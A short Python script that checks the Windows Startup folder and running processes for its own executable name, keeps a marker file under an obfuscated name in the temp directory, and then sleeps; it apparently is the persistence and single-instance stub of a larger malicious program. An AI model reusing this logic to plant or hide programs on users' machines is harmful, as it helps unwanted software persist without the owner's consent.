import os
import sys
import time
from psutil import process_iter
from uuid import uuid4

appdata = os.getenv('appdata')
path = f'{appdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
temp = os.getenv('temp')
if os.path.exists(os.path.join(temp, '{1-607-7H3-M0V35-L1J3-J4663R}')):
    with open(os.path.join(temp, '{1-607-7H3-M0V35-L1J3-J4663R}'), 'r') as f:
        lines = [line.rstrip('\n') for line in f]
    if lines[1] in (p.name() for p in process_iter()):
        sys.exit()
    elif os.path.exists(os.path.join(path, lines[1])):
        sys.exit()
    else:
        try:
            prompt_name = lines[0]
        except Exception:
            prompt_name = str(uuid4())
            with open(os.path.join(temp, '{1-607-7H3-M0V35-L1J3-J4663R}'), 'w') as f:
               f.write(f'{prompt_name}\n')
               f.write(f'{os.path.basename(sys.argv[0])}')
else:
    prompt_name = str(uuid4())
    with open(os.path.join(temp, '{1-607-7H3-M0V35-L1J3-J4663R}'), 'w') as f:
       f.write(f'{prompt_name}\n')
       f.write(f'{os.path.basename(sys.argv[0])}')
time.sleep(1000)
